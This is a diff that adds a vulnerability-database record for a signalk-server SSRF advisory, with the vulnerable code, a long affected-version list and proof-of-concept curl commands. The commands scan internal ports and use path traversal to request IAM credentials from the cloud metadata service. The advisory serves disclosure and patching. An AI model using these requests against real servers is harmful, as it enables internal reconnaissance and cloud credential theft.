@@ -1,0 +1,428 @@
+advisory_id: GHSA-q59x-jc9f-gfqf
+datasource_id: github_osv/GHSA-q59x-jc9f-gfqf
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-q59x-jc9f-gfqf/GHSA-q59x-jc9f-gfqf.json
+aliases:
+  - CVE-2026-55591
+summary: |
+  Signal K Server: Server-Side Request Forgery via Remote Connection Endpoints
+  ### Summary
+  signalk-server versions up to and including 2.27.0 contain a Server-Side Request Forgery (SSRF) vulnerability in three administrative endpoints used for remote Signal K server connection management. The `makeRemoteRequest()` function accepts attacker-controlled `host`, `port`, `useTLS`, and `selfsignedcert` parameters without any validation, allowing an attacker to force the server to make arbitrary HTTP/HTTPS requests to internal network resources, cloud metadata services, and other unintended destinations.
+
+  When security is not configured (the default state), these endpoints require **no authentication**.
+
+  ### Details
+  #### Vulnerable Function
+
+  The core vulnerability is in `makeRemoteRequest()` at `src/serverroutes.ts:2483-2524`:
+
+  ```typescript
+  function makeRemoteRequest(
+    host: string,
+    port: number,
+    useTLS: boolean,
+    selfsignedcert: boolean,
+    path: string,
+    method?: string,
+    headers?: Record<string, string>,
+    body?: unknown
+  ): Promise<{ status: number | undefined; data: string }> {
+    const protocol = useTLS ? https : http
+    return new Promise((resolve, reject) => {
+      const options = {
+        hostname: host,         // NO VALIDATION - attacker controlled
+        port,                   // NO VALIDATION - attacker controlled
+        path,
+        method: method || 'GET',
+        headers: {
+          ...(headers || {}),
+          ...(body ? { 'Content-Type': 'application/json' } : {})
+        },
+        rejectUnauthorized: !selfsignedcert  // Attacker can disable TLS verification
+      }
+      const req = protocol.request(options, (response) => {
+        let data = ''
+        response.on('data', (chunk: string) => {
+          data += chunk
+        })
+        response.on('end', () => {
+          resolve({ status: response.statusCode, data })
+        })
+      })
+      req.on('error', reject)
+      req.setTimeout(10000, () => {
+        req.destroy(new Error('Connection timed out'))
+      })
+      if (body) {
+        req.write(JSON.stringify(body))
+      }
+      req.end()
+    })
+  }
+  ```
+
+  #### Missing Validation
+
+  The function performs **zero validation** on the destination host. The following address ranges are all reachable:
+
+  - **Loopback**: `127.0.0.1`, `::1`, `localhost`
+  - **RFC 1918 private ranges**: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`
+  - **Link-local / Cloud metadata**: `169.254.169.254` (AWS EC2 instance metadata, GCP, Azure IMDS)
+  - **IPv6 link-local**: `fe80::/10`
+  - **Any arbitrary external host**: enabling the server as an open proxy
+
+  #### Authentication Bypass via Default Configuration
+
+  The endpoints are protected by `addAdminMiddleware()` (lines 2339-2345):
+
+  ```typescript
+  app.securityStrategy.addAdminMiddleware(`${SERVERROUTESPREFIX}/testSignalKConnection`)
+  app.securityStrategy.addAdminMiddleware(`${SERVERROUTESPREFIX}/requestAccess`)
+  app.securityStrategy.addAdminMiddleware(`${SERVERROUTESPREFIX}/checkAccessRequest`)
+  ```
+
+  However, when security is not configured, the server uses `dummysecurity.ts`, where `addAdminMiddleware` is a **no-op**:
+
+  ```typescript
+  addAdminMiddleware: () => {},
+  ```
+
+  This means on a default installation with no admin user created, **all three endpoints are accessible without any authentication**.
+
+  #### Additional Attack Surface: TLS Verification Bypass
+
+  The `selfsignedcert` parameter directly controls `rejectUnauthorized`:
+
+  ```typescript
+  rejectUnauthorized: !selfsignedcert
+  ```
+
+  When an attacker sets `selfsignedcert: true`, the server will connect to any HTTPS endpoint without verifying the TLS certificate, enabling MITM attacks on the outbound connection.
+
+  #### Additional Attack Surface: Path Traversal in checkAccessRequest
+
+  The `checkAccessRequest` endpoint interpolates `requestId` directly into the URL path:
+
+  ```typescript
+  `/signalk/v1/requests/${requestId}`
+  ```
+
+  An attacker can use path traversal (e.g., `requestId: "../../other/endpoint"`) to target arbitrary paths on the destination host.
+
+  ### PoC
+  #### Target Setup
+
+  Set up a bare-metal signalk-server for testing (or use Docker to simulate):
+
+  ```bash
+  docker run -d --name signalk-ssrf-poc -p 3000:3000 node:22-bookworm \
+    bash -c 'npm install -g signalk-server@2.27.0 && signalk-server'
+
+  # Wait for startup
+  until curl -s http://127.0.0.1:3000/skServer/loginStatus 2>/dev/null | grep -q "status"; do sleep 10; done
+  ```
+
+  Set the target variable:
+
+  ```bash
+  TARGET=http://127.0.0.1:3000
+  ```
+
+  Confirm `"authenticationRequired":false` in the loginStatus response before proceeding.
+
+  #### PoC 1: Loopback Connection (Self-Discovery)
+
+  ```bash
+  curl -s -X POST $TARGET/skServer/testSignalKConnection \
+    -H "Content-Type: application/json" \
+    -d '{"host":"127.0.0.1","port":3000,"useTLS":false,"selfsignedcert":false}'
+  ```
+
+  **Response** (confirms SSRF, the server connected to itself):
+
+  ```json
+  {
+    "success": true,
+    "authenticated": false,
+    "server": {
+      "id": "signalk-server-node",
+      "version": "2.27.0"
+    }
+  }
+  ```
+
+  #### PoC 2: Port Scanning via Error Differentiation
+
+  ```bash
+  # Open port (3000) — returns server data
+  curl -s -X POST $TARGET/skServer/testSignalKConnection \
+    -H "Content-Type: application/json" \
+    -d '{"host":"127.0.0.1","port":3000,"useTLS":false,"selfsignedcert":false}'
+  # Response: {"success":true,"server":{"id":"signalk-server-node","version":"2.27.0"}}
+
+  # Closed port (9999) — immediate ECONNREFUSED
+  curl -s -X POST $TARGET/skServer/testSignalKConnection \
+    -H "Content-Type: application/json" \
+    -d '{"host":"127.0.0.1","port":9999,"useTLS":false,"selfsignedcert":false}'
+  # Response: {"success":false,"error":"connect ECONNREFUSED 127.0.0.1:9999"}
+
+  # Filtered port — 10-second timeout then error
+  curl -s -X POST $TARGET/skServer/testSignalKConnection \
+    -H "Content-Type: application/json" \
+    -d '{"host":"10.0.0.1","port":22,"useTLS":false,"selfsignedcert":false}'
+  # Response (after 10s): {"success":false,"error":"Connection timed out"}
+  ```
+
+  The three distinct error responses allow an attacker to map internal network topology.
+
+  #### PoC 3: AWS Instance Metadata Service (IMDSv1)
+
+  On a cloud-hosted signalk-server (AWS EC2):
+
+  ```bash
+  curl -s -X POST $TARGET/skServer/testSignalKConnection \
+    -H "Content-Type: application/json" \
+    -d '{"host":"169.254.169.254","port":80,"useTLS":false,"selfsignedcert":false}'
+  ```
+
+  The server connects to the EC2 metadata endpoint. The response will contain the discovery JSON parse result, leaking metadata. For deeper paths, use `checkAccessRequest` with path traversal in `requestId`:
+
+  ```bash
+  curl -s -X POST $TARGET/skServer/checkAccessRequest \
+    -H "Content-Type: application/json" \
+    -d '{"host":"169.254.169.254","port":80,"useTLS":false,"selfsignedcert":false,"requestId":"../../latest/meta-data/iam/security-credentials/ROLE_NAME"}'
+  ```
+
+  ### Impact
+  1. **Internal Network Scanning**: An attacker can probe internal hosts and ports. The response distinguishes between open ports (HTTP response returned), closed ports (connection refused error), and filtered ports (timeout after 10 seconds).
+
+  2. **Cloud Metadata Exfiltration**: On cloud-hosted instances (AWS EC2, GCP, Azure), an attacker can reach the instance metadata service at `169.254.169.254` to steal IAM credentials, instance identity tokens, and other sensitive metadata.
+
+  3. **Internal Service Data Exfiltration**: The `testSignalKConnection` endpoint returns the full response body from the target, allowing reading of data from internal HTTP services not otherwise accessible from the internet.
+
+  4. **Server-Side POST Requests**: The `requestAccess` endpoint sends a POST request with attacker-controlled JSON body (`clientId`, `description`), enabling interaction with internal APIs that accept POST requests.
+
+  5. **Lateral Movement**: In containerized or Kubernetes environments, the server can be used to access cluster-internal services, the Kubernetes API, or other containers on the Docker network.
+impacted_packages:
+  - purl: pkg:npm/signalk-server
+    affected_versions: vers:npm/<=2.27.0
+    fixed_versions: vers:npm/2.28.0
+    affected_packages:
+      - pkg:npm/signalk-server@0.1.24
+      - pkg:npm/signalk-server@0.1.27
+      - pkg:npm/signalk-server@0.1.28
+      - pkg:npm/signalk-server@0.1.29
+      - pkg:npm/signalk-server@0.1.30
+      - pkg:npm/signalk-server@0.1.31
+      - pkg:npm/signalk-server@0.1.32
+      - pkg:npm/signalk-server@1.0.0-0
+      - pkg:npm/signalk-server@1.0.0-1
+      - pkg:npm/signalk-server@1.0.0-2
+      - pkg:npm/signalk-server@1.0.0-3
+      - pkg:npm/signalk-server@1.0.0-4
+      - pkg:npm/signalk-server@1.0.0
+      - pkg:npm/signalk-server@1.1.0
+      - pkg:npm/signalk-server@1.1.1
+      - pkg:npm/signalk-server@1.1.2
+      - pkg:npm/signalk-server@1.2.0
+      - pkg:npm/signalk-server@1.2.1
+      - pkg:npm/signalk-server@1.2.2
+      - pkg:npm/signalk-server@1.2.3
+      - pkg:npm/signalk-server@1.2.4
+      - pkg:npm/signalk-server@1.3.0
+      - pkg:npm/signalk-server@1.4.0
+      - pkg:npm/signalk-server@1.4.1
+      - pkg:npm/signalk-server@1.4.2
+      - pkg:npm/signalk-server@1.4.3
+      - pkg:npm/signalk-server@1.5.0
+      - pkg:npm/signalk-server@1.6.0
+      - pkg:npm/signalk-server@1.7.0
+      - pkg:npm/signalk-server@1.7.1
+      - pkg:npm/signalk-server@1.8.0
+      - pkg:npm/signalk-server@1.9.0
+      - pkg:npm/signalk-server@1.9.1
+      - pkg:npm/signalk-server@1.10.0
+      - pkg:npm/signalk-server@1.10.1
+      - pkg:npm/signalk-server@1.10.2
+      - pkg:npm/signalk-server@1.11.0
+      - pkg:npm/signalk-server@1.12.0
+      - pkg:npm/signalk-server@1.13.0
+      - pkg:npm/signalk-server@1.13.1
+      - pkg:npm/signalk-server@1.14.0
+      - pkg:npm/signalk-server@1.15.0
+      - pkg:npm/signalk-server@1.16.0
+      - pkg:npm/signalk-server@1.17.0
+      - pkg:npm/signalk-server@1.18.0-beta.1
+      - pkg:npm/signalk-server@1.18.0-beta.2
+      - pkg:npm/signalk-server@1.18.0-beta.3
+      - pkg:npm/signalk-server@1.18.0-beta.4
+      - pkg:npm/signalk-server@1.18.0-beta.5
+      - pkg:npm/signalk-server@1.18.0-beta.6
+      - pkg:npm/signalk-server@1.18.0
+      - pkg:npm/signalk-server@1.19.0-beta.1
+      - pkg:npm/signalk-server@1.19.0-beta.2
+      - pkg:npm/signalk-server@1.19.0
+      - pkg:npm/signalk-server@1.20.0
+      - pkg:npm/signalk-server@1.21.0
+      - pkg:npm/signalk-server@1.22.0
+      - pkg:npm/signalk-server@1.23.0
+      - pkg:npm/signalk-server@1.24.0
+      - pkg:npm/signalk-server@1.25.0
+      - pkg:npm/signalk-server@1.26.0
+      - pkg:npm/signalk-server@1.27.0
+      - pkg:npm/signalk-server@1.27.1
+      - pkg:npm/signalk-server@1.28.0-beta.1
+      - pkg:npm/signalk-server@1.28.0
+      - pkg:npm/signalk-server@1.29.0-beta.1
+      - pkg:npm/signalk-server@1.29.0
+      - pkg:npm/signalk-server@1.30.0
+      - pkg:npm/signalk-server@1.31.0
+      - pkg:npm/signalk-server@1.32.0
+      - pkg:npm/signalk-server@1.33.0-beta.1
+      - pkg:npm/signalk-server@1.33.0
+      - pkg:npm/signalk-server@1.34.0
+      - pkg:npm/signalk-server@1.35.0
+      - pkg:npm/signalk-server@1.35.1
+      - pkg:npm/signalk-server@1.35.2
+      - pkg:npm/signalk-server@1.36.0-beta.1
+      - pkg:npm/signalk-server@1.36.0-beta.2
+      - pkg:npm/signalk-server@1.36.0-beta.3
+      - pkg:npm/signalk-server@1.36.0
+      - pkg:npm/signalk-server@1.37.0-beta.1
+      - pkg:npm/signalk-server@1.37.0-beta.3
+      - pkg:npm/signalk-server@1.37.0
+      - pkg:npm/signalk-server@1.37.1
+      - pkg:npm/signalk-server@1.37.2
+      - pkg:npm/signalk-server@1.37.3
+      - pkg:npm/signalk-server@1.37.4
+      - pkg:npm/signalk-server@1.37.5
+      - pkg:npm/signalk-server@1.37.6
+      - pkg:npm/signalk-server@1.38.0
+      - pkg:npm/signalk-server@1.38.1
+      - pkg:npm/signalk-server@1.39.0
+      - pkg:npm/signalk-server@1.40.0
+      - pkg:npm/signalk-server@1.41.0-beta.2
+      - pkg:npm/signalk-server@1.41.0-beta.3
+      - pkg:npm/signalk-server@1.41.0-beta.4
+      - pkg:npm/signalk-server@1.41.0
+      - pkg:npm/signalk-server@1.41.1
+      - pkg:npm/signalk-server@1.41.2
+      - pkg:npm/signalk-server@1.41.3
+      - pkg:npm/signalk-server@1.42.0
+      - pkg:npm/signalk-server@1.43.0
+      - pkg:npm/signalk-server@1.44.0
+      - pkg:npm/signalk-server@1.45.0
+      - pkg:npm/signalk-server@1.46.2
+      - pkg:npm/signalk-server@1.46.3
+      - pkg:npm/signalk-server@2.0.0-beta.1
+      - pkg:npm/signalk-server@2.0.0-beta.2
+      - pkg:npm/signalk-server@2.0.0-beta.5
+      - pkg:npm/signalk-server@2.0.0-beta.6
+      - pkg:npm/signalk-server@2.0.0-beta.7
+      - pkg:npm/signalk-server@2.0.0-beta.9
+      - pkg:npm/signalk-server@2.0.0-beta.11
+      - pkg:npm/signalk-server@2.0.0-beta.12
+      - pkg:npm/signalk-server@2.0.0
+      - pkg:npm/signalk-server@2.1.0
+      - pkg:npm/signalk-server@2.1.1
+      - pkg:npm/signalk-server@2.2.0
+      - pkg:npm/signalk-server@2.3.0-beta.2
+      - pkg:npm/signalk-server@2.3.0-canboatv2.1
+      - pkg:npm/signalk-server@2.3.0
+      - pkg:npm/signalk-server@2.3.1
+      - pkg:npm/signalk-server@2.4.0
+      - pkg:npm/signalk-server@2.4.1
+      - pkg:npm/signalk-server@2.5.0
+      - pkg:npm/signalk-server@2.6.0
+      - pkg:npm/signalk-server@2.6.1
+      - pkg:npm/signalk-server@2.6.2
+      - pkg:npm/signalk-server@2.7.0
+      - pkg:npm/signalk-server@2.7.1
+      - pkg:npm/signalk-server@2.7.2
+      - pkg:npm/signalk-server@2.8.0
+      - pkg:npm/signalk-server@2.8.1
+      - pkg:npm/signalk-server@2.8.2
+      - pkg:npm/signalk-server@2.8.3
+      - pkg:npm/signalk-server@2.9.0
+      - pkg:npm/signalk-server@2.10.0
+      - pkg:npm/signalk-server@2.11.0
+      - pkg:npm/signalk-server@2.12.0
+      - pkg:npm/signalk-server@2.13.0-beta.1
+      - pkg:npm/signalk-server@2.13.0-beta.2
+      - pkg:npm/signalk-server@2.13.0-beta.3
+      - pkg:npm/signalk-server@2.13.0
+      - pkg:npm/signalk-server@2.13.1
+      - pkg:npm/signalk-server@2.13.2
+      - pkg:npm/signalk-server@2.13.3
+      - pkg:npm/signalk-server@2.13.4
+      - pkg:npm/signalk-server@2.13.5
+      - pkg:npm/signalk-server@2.14.0-beta.1
+      - pkg:npm/signalk-server@2.14.0
+      - pkg:npm/signalk-server@2.14.1
+      - pkg:npm/signalk-server@2.14.2
+      - pkg:npm/signalk-server@2.14.3
+      - pkg:npm/signalk-server@2.14.4
+      - pkg:npm/signalk-server@2.15.0-beta.1
+      - pkg:npm/signalk-server@2.15.0-beta.2
+      - pkg:npm/signalk-server@2.15.0-beta.3
+      - pkg:npm/signalk-server@2.15.0-beta.4
+      - pkg:npm/signalk-server@2.15.0-beta.5
+      - pkg:npm/signalk-server@2.15.0-beta.6
+      - pkg:npm/signalk-server@2.15.0
+      - pkg:npm/signalk-server@2.15.1
+      - pkg:npm/signalk-server@2.15.2
+      - pkg:npm/signalk-server@2.15.3
+      - pkg:npm/signalk-server@2.16.0
+      - pkg:npm/signalk-server@2.17.0
+      - pkg:npm/signalk-server@2.17.2
+      - pkg:npm/signalk-server@2.18.0
+      - pkg:npm/signalk-server@2.19.0-beta.1
+      - pkg:npm/signalk-server@2.19.0-beta.2
+      - pkg:npm/signalk-server@2.19.0-beta.4
+      - pkg:npm/signalk-server@2.19.0-beta.5
+      - pkg:npm/signalk-server@2.19.0
+      - pkg:npm/signalk-server@2.19.1
+      - pkg:npm/signalk-server@2.20.0-beta.1
+      - pkg:npm/signalk-server@2.20.0
+      - pkg:npm/signalk-server@2.20.1
+      - pkg:npm/signalk-server@2.20.2
+      - pkg:npm/signalk-server@2.20.3
+      - pkg:npm/signalk-server@2.21.0
+      - pkg:npm/signalk-server@2.21.1
+      - pkg:npm/signalk-server@2.21.2
+      - pkg:npm/signalk-server@2.21.3
+      - pkg:npm/signalk-server@2.22.0
+      - pkg:npm/signalk-server@2.22.1
+      - pkg:npm/signalk-server@2.23.0-beta.1
+      - pkg:npm/signalk-server@2.23.0-beta.2
+      - pkg:npm/signalk-server@2.23.0
+      - pkg:npm/signalk-server@2.24.0-beta.3
+      - pkg:npm/signalk-server@2.24.0-beta.4
+      - pkg:npm/signalk-server@2.24.0
+      - pkg:npm/signalk-server@2.25.0
+      - pkg:npm/signalk-server@2.26.0
+      - pkg:npm/signalk-server@2.27.0
+    fixed_packages:
+      - pkg:npm/signalk-server@2.28.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '5.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-q59x-jc9f-gfqf/GHSA-q59x-jc9f-gfqf.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-918
+references:
+  - url: https://github.com/SignalK/signalk-server
+    reference_type:
+    reference_id:
+  - url: https://github.com/SignalK/signalk-server/security/advisories/GHSA-q59x-jc9f-gfqf
+    reference_type:
+    reference_id:
+exploits: []
